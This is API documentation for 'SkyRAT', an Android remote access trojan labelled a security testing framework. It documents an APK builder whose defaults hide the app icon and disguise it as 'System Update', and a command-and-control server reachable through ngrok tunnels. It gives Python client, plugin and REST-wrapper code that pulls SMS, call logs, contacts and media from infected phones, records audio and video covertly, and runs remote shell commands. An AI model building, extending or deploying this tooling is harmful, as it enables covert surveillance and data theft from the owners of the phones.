# SkyRAT API Documentation

Comprehensive API documentation for the SkyRAT Android Security Testing Framework.

## 📋 Table of Contents

- [Python Framework API](#python-framework-api)
- [Network Protocol](#network-protocol)
- [Android Client API](#android-client-api)
- [Integration Examples](#integration-examples)
- [Custom Extensions](#custom-extensions)

## 🐍 Python Framework API

### **SkyRATBuilder Class**

The main class for building APKs from Android source code.

#### **Constructor**
```python
from utils.builder import SkyRATBuilder

builder = SkyRATBuilder(debug=False)
```

**Parameters:**
- `debug` (bool): Enable verbose logging and debug output

#### **Methods**

##### **build_apk(config)**
Build APK with specified configuration.

```python
config = {
    'ip': '192.168.1.100',
    'port': '8000',
    'icon_visible': False,
    'app_name': 'System Update',
    'output': 'test.apk'
}

success = builder.build_apk(config)
```

**Parameters:**
- `config` (dict): Build configuration dictionary

**Config Dictionary:**
| Key | Type | Required | Description |
|-----|------|----------|-------------|
| `ip` | str | Yes | Server IP address |
| `port` | str | Yes | Server port |
| `icon_visible` | bool | No | App icon visibility (default: False) |
| `app_name` | str | No | App display name (default: "System Update") |
| `output` | str | No | Output APK filename (default: "skyrat.apk") |

**Returns:**
- `bool`: True if build successful, False otherwise

##### **clean_build_directory()**
Clean the build directory before building.

```python
builder.clean_build_directory()
```

##### **get_output_path(filename)**
Get full path for output file.

```python
full_path = builder.get_output_path("test.apk")
# Returns: Path object to build/test.apk
```

**Parameters:**
- `filename` (str): APK filename

**Returns:**
- `Path`: Full path to output file

#### **Static Methods**

##### **validate_ip(ip)**
Validate IP address format.

```python
from utils.builder import validate_ip

is_valid = validate_ip("192.168.1.100")  # Returns: True
is_valid = validate_ip("256.1.1.1")     # Returns: False
```

##### **validate_port(port)**
Validate port number.

```python
from utils.builder import validate_port

is_valid = validate_port("8000")   # Returns: True
is_valid = validate_port("70000")  # Returns: False
```

### **SkyRATServer Class**

The main class for handling C&C server operations.

#### **Constructor**
```python
from utils.server import SkyRATServer

server = SkyRATServer(debug=False)
```

#### **Methods**

##### **recvall(sock, timeout=15.0)**
Enhanced receive function with configurable timeout.

```python
response = server.recvall(client_socket, timeout=30.0)
```

**Parameters:**
- `sock` (socket): Client socket
- `timeout` (float): Timeout in seconds

**Returns:**
- `str`: Received data

##### **handle_download(client, command)**
Handle file download from device.

```python
server.handle_download(client_socket, "download /sdcard/test.txt")
```

##### **save_timestamped_file(data_type, content, extension="txt")**
Save data to timestamped file.

```python
filename = server.save_timestamped_file("device_info", data, "txt")
```

**Parameters:**
- `data_type` (str): Type of data for filename
- `content` (str): File content
- `extension` (str): File extension

**Returns:**
- `Path`: Path to saved file

### **NetworkManager Class**

Network utilities and ngrok integration.

#### **Constructor**
```python
from utils.network import NetworkManager

network = NetworkManager()
```

#### **Methods**

##### **setup_tunnel(port)**
Setup ngrok tunnel for external access.

```python
tunnel_info = network.setup_tunnel(8000)
# Returns: (ip, port) tuple
```

##### **get_connection_info(ip, port, use_ngrok=False)**
Get connection information for different deployment types.

```python
info = network.get_connection_info(
    ip="192.168.1.100", 
    port="8000", 
    use_ngrok=True
)
```

**Returns:**
```python
{
    'type': 'ngrok',
    'ip': '2.tcp.ngrok.io',
    'port': '12345',
    'local_port': '8000',
    'url': 'tcp://2.tcp.ngrok.io:12345'
}
```

#### **Utility Functions**

##### **setup_ngrok(port)**
Standalone ngrok setup function.

```python
from utils.network import setup_ngrok

ip, port = setup_ngrok(8000)
```

##### **validate_ip_address(ip)**
Validate IP address format.

```python
from utils.network import validate_ip_address

is_valid = validate_ip_address("192.168.1.100")
```

## 🌐 Network Protocol

### **Communication Protocol**

SkyRAT uses a text-based TCP protocol with specific message formatting.

#### **Message Format**
```
COMMAND\n
[RESPONSE_DATA]
END123\n
```

#### **Command Structure**
All commands are sent as plain text followed by newline:

```python
# Send command
client.send("deviceInfo\n".encode("UTF-8"))

# Receive response
response = ""
while "END123" not in response:
    chunk = client.recv(8192).decode("UTF-8", "ignore")
    response += chunk

# Clean response
final_response = response.split("END123")[0].strip()
```

#### **File Transfer Protocol**

##### **Download Format**
```
download /path/to/file\n
getFile\n
filename|_|extension|_|base64_encoded_data
END123\n
```

##### **Upload Format**
```
upload filename base64_encoded_data\n
SUCCESS: File uploaded successfully
END123\n
```

#### **Recording Protocol**

##### **Video Recording**
```
# Start recording
startVideo 0\n
Video recording started successfully!
END123\n

# Stop recording  
stopVideo\n
[VIDEO_METADATA]
VIDEO_DATA:base64_encoded_video_data
END123\n
```

##### **Audio Recording**
```
# Start recording
startAudio\n
Audio recording started successfully!
END123\n

# Stop recording
stopAudio\n
[AUDIO_METADATA]
AUDIO_DATA:base64_encoded_audio_data
END123\n
```

### **Error Handling**

#### **Error Response Format**
```
ERROR: Error description
END123\n
```

#### **Timeout Response**
```
TIMEOUT: No response received (command may still be running)
END123\n
```

### **Connection Management**

#### **Welcome Message**
Upon connection, the Android client sends:
```
Hello there, welcome to complete shell of [DEVICE_MODEL] (Android [VERSION])
END123\n
```

#### **Connection Lifecycle**
1. **Client connects** to server
2. **Welcome message** sent by client
3. **Command/response cycle** begins
4. **Exit command** or connection loss terminates session

## 📱 Android Client API

### **Configuration Management**

#### **Config.kt Structure**
```kotlin
object Config {
    /** Server IP address for C&C connection */
    const val IP = "192.168.1.100"
    
    /** Server port for C&C connection */
    const val PORT = "8000"
    
    /** App icon visibility (true = hidden, false = visible) */
    const val ICON = true
}
```

### **Core Components**

#### **BackgroundTcpManager**
Main networking component handling server communication.

##### **Key Methods**
```kotlin
class BackgroundTcpManager(private val context: Context) {
    fun startConnection()
    fun processCommand(command: String): String
    fun sendResponse(message: String)
}
```

#### **MainService**
Background service for persistence.

```kotlin
class MainService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int
    override fun onDestroy()
}
```

#### **Functions Class**
Utility functions for device operations.

```kotlin
class Functions(private val activity: Activity?) {
    fun hideAppIcon(context: Context)
    fun unHideAppIcon(context: Context)
    fun jobScheduler(context: Context)
    fun createNotificationChannel(context: Context)
}
```

### **Permission Management**

#### **Required Permissions Array**
```kotlin
private val requiredPermissions = arrayOf(
    Manifest.permission.CAMERA,
    Manifest.permission.RECORD_AUDIO,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.READ_SMS,
    Manifest.permission.READ_CALL_LOG,
    Manifest.permission.READ_CONTACTS,
    Manifest.permission.READ_PHONE_STATE,
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.ACCESS_COARSE_LOCATION,
    // ... additional permissions
)
```

## 🔧 Integration Examples

### **Custom Python Client**

Create a custom client to interact with SkyRAT server:

```python
#!/usr/bin/env python3
# custom_client.py

import socket
import time
import json

class SkyRATClient:
    def __init__(self, host="localhost", port=8000):
        self.host = host
        self.port = port
        self.socket = None
        
    def connect(self):
        """Connect to SkyRAT server"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        
        # Receive welcome message
        welcome = self.receive_response()
        print(f"Connected: {welcome}")
        
    def send_command(self, command):
        """Send command to server"""
        if self.socket:
            self.socket.send(f"{command}\n".encode())
            return self.receive_response()
            
    def receive_response(self):
        """Receive response from server"""
        response = ""
        while "END123" not in response:
            data = self.socket.recv(8192).decode('utf-8', errors='ignore')
            response += data
        return response.replace("END123", "").strip()
        
    def get_device_info(self):
        """Get device information"""
        return self.send_command("deviceInfo")
        
    def extract_sms(self, box_type="inbox"):
        """Extract SMS messages"""
        return self.send_command(f"getSMS {box_type}")
        
    def download_file(self, file_path):
        """Download file from device"""
        return self.send_command(f"download {file_path}")
        
    def disconnect(self):
        """Disconnect from server"""
        if self.socket:
            self.send_command("exit")
            self.socket.close()

# Usage example
client = SkyRATClient("192.168.1.100", 8000)
client.connect()

device_info = client.get_device_info()
print("Device Info:", device_info)

sms_data = client.extract_sms("inbox")
print("SMS Data:", sms_data)

client.disconnect()
```

### **Automated Testing Framework**

```python
#!/usr/bin/env python3
# automated_testing.py

import unittest
from skyrat_client import SkyRATClient
import time

class SkyRATAutomatedTest(unittest.TestCase):
    
    def setUp(self):
        """Setup test environment"""
        self.client = SkyRATClient("localhost", 8000)
        self.client.connect()
        
    def tearDown(self):
        """Cleanup after test"""
        self.client.disconnect()
        
    def test_device_connectivity(self):
        """Test basic device connectivity"""
        response = self.client.get_device_info()
        self.assertIn("DEVICE INFORMATION", response)
        
    def test_file_operations(self):
        """Test file operations"""
        # List directory
        response = self.client.send_command("ls /sdcard")
        self.assertIn("DIRECTORY LISTING", response)
        
    def test_data_extraction(self):
        """Test data extraction capabilities"""
        # Test SMS extraction
        response = self.client.extract_sms("inbox")
        self.assertIn("SMS", response)
        
        # Test contact extraction
        response = self.client.send_command("getContacts")
        self.assertIn("CONTACTS", response)
        
    def test_system_information(self):
        """Test system information gathering"""
        commands = ["getIP", "sysinfo", "getApps"]
        
        for cmd in commands:
            with self.subTest(command=cmd):
                response = self.client.send_command(cmd)
                self.assertNotIn("ERROR", response)
                self.assertNotIn("TIMEOUT", response)

if __name__ == "__main__":
    unittest.main()
```

### **Data Analysis Integration**

```python
#!/usr/bin/env python3
# data_analyzer.py

import json
import pandas as pd
from datetime import datetime
import matplotlib.pyplot as plt

class SkyRATDataAnalyzer:
    
    def __init__(self, client):
        self.client = client
        
    def collect_all_data(self):
        """Collect comprehensive device data"""
        data = {}
        
        # Device information
        data['device_info'] = self.client.get_device_info()
        data['system_info'] = self.client.send_command("sysinfo")
        data['network_info'] = self.client.send_command("getIP")
        
        # Communication data
        data['sms_inbox'] = self.client.extract_sms("inbox")
        data['sms_sent'] = self.client.extract_sms("sent")
        data['call_logs'] = self.client.send_command("getCallLogs")
        data['contacts'] = self.client.send_command("getContacts")
        
        # Application data
        data['apps'] = self.client.send_command("getApps")
        data['processes'] = self.client.send_command("ps")
        
        return data
        
    def analyze_communication_patterns(self, sms_data):
        """Analyze SMS communication patterns"""
        # Extract timestamps and analyze patterns
        # Implementation depends on SMS data format
        pass
        
    def generate_security_report(self, data):
        """Generate comprehensive security report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'device_profile': self.extract_device_profile(data['device_info']),
            'security_analysis': self.analyze_security_posture(data),
            'risk_assessment': self.assess_risks(data),
            'recommendations': self.generate_recommendations(data)
        }
        return report
        
    def export_results(self, data, format='json'):
        """Export analysis results"""
        if format == 'json':
            with open(f'skyrat_analysis_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json', 'w') as f:
                json.dump(data, f, indent=2)
        elif format == 'excel':
            # Convert to pandas and export to Excel
            pass

# Usage
client = SkyRATClient("192.168.1.100", 8000)
client.connect()

analyzer = SkyRATDataAnalyzer(client)
collected_data = analyzer.collect_all_data()
security_report = analyzer.generate_security_report(collected_data)

analyzer.export_results(security_report)
client.disconnect()
```

## 🔌 Custom Extensions

### **Plugin Architecture**

Create custom plugins for SkyRAT:

```python
#!/usr/bin/env python3
# skyrat_plugin.py

from abc import ABC, abstractmethod

class SkyRATPlugin(ABC):
    """Base class for SkyRAT plugins"""
    
    def __init__(self, name, version):
        self.name = name
        self.version = version
        
    @abstractmethod
    def initialize(self, client):
        """Initialize plugin with SkyRAT client"""
        pass
        
    @abstractmethod
    def execute(self, *args, **kwargs):
        """Execute plugin functionality"""
        pass
        
    @abstractmethod
    def cleanup(self):
        """Cleanup plugin resources"""
        pass

class ForensicsPlugin(SkyRATPlugin):
    """Example forensics plugin"""
    
    def __init__(self):
        super().__init__("ForensicsPlugin", "1.0.0")
        self.client = None
        
    def initialize(self, client):
        """Initialize forensics plugin"""
        self.client = client
        print(f"Initializing {self.name} v{self.version}")
        
    def execute(self, evidence_type="all"):
        """Collect forensic evidence"""
        evidence = {}
        
        if evidence_type in ["all", "communication"]:
            evidence['sms'] = self.client.extract_sms("inbox")
            evidence['calls'] = self.client.send_command("getCallLogs")
            evidence['contacts'] = self.client.send_command("getContacts")
            
        if evidence_type in ["all", "media"]:
            evidence['photos'] = self.client.send_command("getPhotos")
            evidence['videos'] = self.client.send_command("getVideos")
            evidence['audio'] = self.client.send_command("getAudio")
            
        if evidence_type in ["all", "system"]:
            evidence['device_info'] = self.client.get_device_info()
            evidence['apps'] = self.client.send_command("getApps")
            evidence['processes'] = self.client.send_command("ps")
            
        return evidence
        
    def cleanup(self):
        """Cleanup forensics plugin"""
        print(f"Cleaning up {self.name}")

# Plugin usage
client = SkyRATClient("192.168.1.100", 8000)
client.connect()

forensics = ForensicsPlugin()
forensics.initialize(client)

# Collect all evidence
evidence = forensics.execute("all")

# Process and export evidence
forensics.cleanup()
client.disconnect()
```

### **REST API Wrapper**

Create a REST API wrapper for SkyRAT:

```python
#!/usr/bin/env python3
# skyrat_api.py

from flask import Flask, jsonify, request
from skyrat_client import SkyRATClient
import threading
import time

app = Flask(__name__)

class SkyRATAPI:
    def __init__(self):
        self.clients = {}
        
    def get_client(self, session_id):
        """Get or create client for session"""
        if session_id not in self.clients:
            client = SkyRATClient("localhost", 8000)
            client.connect()
            self.clients[session_id] = client
        return self.clients[session_id]

api = SkyRATAPI()

@app.route('/api/device/<session_id>/info', methods=['GET'])
def get_device_info(session_id):
    """Get device information"""
    try:
        client = api.get_client(session_id)
        info = client.get_device_info()
        return jsonify({'status': 'success', 'data': info})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/device/<session_id>/sms', methods=['GET'])
def get_sms(session_id):
    """Get SMS messages"""
    box_type = request.args.get('type', 'inbox')
    try:
        client = api.get_client(session_id)
        sms_data = client.extract_sms(box_type)
        return jsonify({'status': 'success', 'data': sms_data})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/device/<session_id>/command', methods=['POST'])
def execute_command(session_id):
    """Execute custom command"""
    command = request.json.get('command')
    if not command:
        return jsonify({'status': 'error', 'message': 'Command required'})
        
    try:
        client = api.get_client(session_id)
        response = client.send_command(command)
        return jsonify({'status': 'success', 'data': response})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
```

## 📚 API Reference Summary

### **Core Classes**
- `SkyRATBuilder`: APK building and configuration
- `SkyRATServer`: C&C server operations
- `NetworkManager`: Network utilities and ngrok

### **Key Functions**
- `get_shell()`: Main server entry point
- `setup_ngrok()`: External access setup
- `validate_ip()`, `validate_port()`: Input validation

### **Protocol Endpoints**
- Device Information: `deviceInfo`, `getIP`, `sysinfo`
- Data Extraction: `getSMS`, `getCallLogs`, `getContacts`
- File Operations: `download`, `upload`, `ls`, `delete`
- Recording: `startAudio`, `stopAudio`, `startVideo`, `stopVideo`
- System Control: `shell`, `ps`, `kill`, `vibrate`

### **Data Formats**
- Text-based TCP protocol
- Base64 encoding for binary data
- JSON for structured data export
- Timestamped file organization

---

**This API documentation provides comprehensive coverage of SkyRAT's capabilities for developers and security researchers looking to integrate or extend the framework.**